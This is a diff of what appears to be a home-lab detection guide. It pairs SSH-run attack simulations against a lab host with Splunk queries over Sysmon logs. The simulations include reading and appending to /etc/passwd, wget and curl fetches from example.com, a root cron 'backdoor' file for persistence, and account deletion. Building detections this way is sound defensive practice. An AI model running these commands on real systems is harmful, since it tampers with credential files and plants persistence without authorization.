@@ -333,41 +333,83 @@ index=sysmon_logs adduser OR useradd
 ```
 Privilege Escalation
 Attack (Kali)
+```bash
+
 ssh user@192.168.80.133 "sudo id"
+```
+
 Splunk Query
+```bash
+
 index=sysmon_logs sudo
+```
  Account Discovery
 Attack (Kali)
+```bash
 ssh user@192.168.80.133 "cat /etc/passwd"
+```
 Splunk Query
+```bash
+
 index=sysmon_logs "/etc/passwd"
+```
 5️⃣ Sensitive File Modification
 Attack (Kali)
+```bash
+
 ssh user@192.168.80.133 "echo labtest | sudo tee -a /etc/passwd"
+```
 Splunk Query
+```
 index=sysmon_logs "/etc/passwd"
-6️⃣ Tool Download (Ingress Transfer — T1105)
+```
+```bash
+ Tool Download (Ingress Transfer — T1105)
 Attack (Kali)
+```bash
+
 ssh user@192.168.80.133 "wget http://example.com"
+```
 Splunk Query
+```bash
 index=sysmon_logs wget OR TechniqueID=T1105
-7️⃣ Outbound Connection
+```
+Outbound Connection
 Attack (Kali)
+```bash
 ssh user@192.168.80.133 "curl http://example.com"
+```
 Splunk Query
+```bash
 index=sysmon_logs curl OR EventID=3
+```
 8️⃣ Scheduled Task Persistence (Cron)
 Attack (Kali)
+```bash
+
 ssh user@192.168.80.133 "echo '* * * * * /usr/bin/id' | sudo tee /etc/cron.d/backdoor"
+```
 Splunk Query
+```bash
+
 index=sysmon_logs cron OR crontab
+```
 9️⃣ Account Deletion (Cleanup)
 Attack (Kali)
+```bash
+
 ssh user@192.168.80.133 "sudo deluser backdoor"
+```
 Splunk Query
+```bash
+
 index=sysmon_logs deluser
+```
 🔎 Full Attacker Timeline
+```bash
+
 index=sysmon_logs
 | sort - _time
 | table _time User Image CommandLine TechniqueID
+```
 
